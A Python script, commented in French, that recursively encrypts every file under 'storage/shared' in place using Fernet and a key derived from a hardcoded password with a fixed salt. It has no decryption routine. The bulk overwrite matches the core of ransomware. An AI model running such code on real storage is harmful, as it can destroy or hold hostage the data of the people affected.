import os
from cryptography.fernet import Fernet

def encrypt_file(file_path, key):
    fernet = Fernet(key)
    with open(file_path, 'rb') as file:
        original = file.read()
    encrypted = fernet.encrypt(original)
    with open(file_path, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

def encrypt_directory(directory_path, key):
    for root, dirs, files in os.walk(directory_path):
        for file in files:
            file_path = os.path.join(root, file)
            try:
                encrypt_file(file_path, key)
                print(f"File {file_path} encrypted.")
            except Exception as e:
                print(f"Failed to encrypt {file_path}. Reason: {str(e)}")

# Génère une clé Fernet à partir de la clé fournie (doit être de 32 bytes)
def generate_fernet_key(user_key):
    from cryptography.hazmat.backends import default_backend
    from cryptography.hazmat.primitives import hashes
    from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
    import base64
    
    # Le sel doit être aléatoire dans un cas réel, mais constant dans cet exemple pour simplifier
    salt = b'salt_1234567890'
    kdf = PBKDF2HMAC(
        algorithm=hashes.SHA256(),
        length=32,
        salt=salt,
        iterations=100000,
        backend=default_backend()
    )
    key = base64.urlsafe_b64encode(kdf.derive(user_key.encode()))
    return key

# Votre clé personnelle
user_key = "Djakfvbdajj71818!**$&×&£×&^"

# Génère une clé compatible avec Fernet
fernet_key = generate_fernet_key(user_key)

# Chemin vers le dossier à chiffrer
directory_to_encrypt = "storage/shared"

encrypt_directory(directory_to_encrypt, fernet_key)
